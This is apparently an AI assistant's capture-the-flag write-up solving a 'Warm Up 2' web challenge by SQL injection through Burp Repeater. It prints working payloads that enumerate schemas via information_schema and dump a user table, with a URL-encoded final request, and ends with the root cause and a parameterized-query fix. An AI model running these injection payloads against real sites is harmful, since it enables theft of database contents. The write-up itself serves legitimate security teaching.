New instance confirmed working. Real flag: `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`. Here's a clean Burp-style writeup.

---

# Warm Up 2 — Web Writeup (Burp Suite)

**Flag:** `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`

## Recon
Browse the site. The **Products** page has a search box that submits via GET:
```
GET /products.php?search=hoodie
```
A search feature talking to a product database = prime **SQL injection** target.

## Setup in Burp
1. Proxy your browser through Burp (or use Burp's built-in browser).
2. Search for anything on `products.php` so the request lands in **Proxy → HTTP history**.
3. Right-click it → **Send to Repeater** (Ctrl+R). We'll do everything from Repeater now — edit the `search` value, hit **Send**, read the response.

> Tip: when you type a payload, select it and press **Ctrl+U** so Burp URL-encodes it before sending.

---

## Step 1 — Break the query with a single quote
In Repeater set:
```
search='
```
**Response:** a MariaDB `Fatal error` page. SQLi confirmed, and it even drops a teaser flag:
```
Flag: HNYX{MySqL_3rR0r_4nYwh3R3???!!}
```
This is a *hint*, not the real flag. The error confirms the backend is MySQL/MariaDB and that errors are verbose — exactly what we need.

## Step 2 — Count the columns
We want a **UNION** to inject our own rows, but UNION needs a matching column count. Try:
```
search=' UNION SELECT 1,2,3-- -      → error (wrong count)
search=' UNION SELECT 1,2,3,4-- -    → works! a card shows "2 / 3 / $4.00"
```
So the query has **4 columns**, and columns **2, 3, 4** are the ones printed on the page (name / description / price). `-- -` just comments out the rest of the original query.

## Step 3 — Find where the flag lives
List every database/table/column using `information_schema`:
```
search=' UNION SELECT 1,table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys')-- -
```
Among several decoy databases, one stands out:
```
network_portal . user . flag   ← the real target (it's in ANOTHER database)
```
This matches the teaser's hint to look further.

## Step 4 — Dump the flag
Select the real columns, fully qualifying the other database as `network_portal.user`:
```
search=' UNION SELECT 1,username,flag,role FROM network_portal.user-- -
```
**Response** shows a new product card:
```
youfoundtherealadmin → HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}
```

🏁 **Flag:** `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`

---

## Quick recap
`'` → confirm SQLi → `UNION SELECT 1,2,3,4` finds 4 columns → `information_schema` reveals a `flag` column in the **network_portal** database → UNION dump returns the flag.

**Root cause:** user input concatenated straight into the SQL string (no prepared statements) plus verbose errors enabled. Fix with parameterized queries and disabled error display.

---

If it helps, the exact value to paste into the Repeater request line for the final step (already URL-encoded) is:
```
GET /products.php?search=%27%20UNION%20SELECT%201%2Cusername%2Cflag%2Crole%20FROM%20network_portal.user--%20-
```
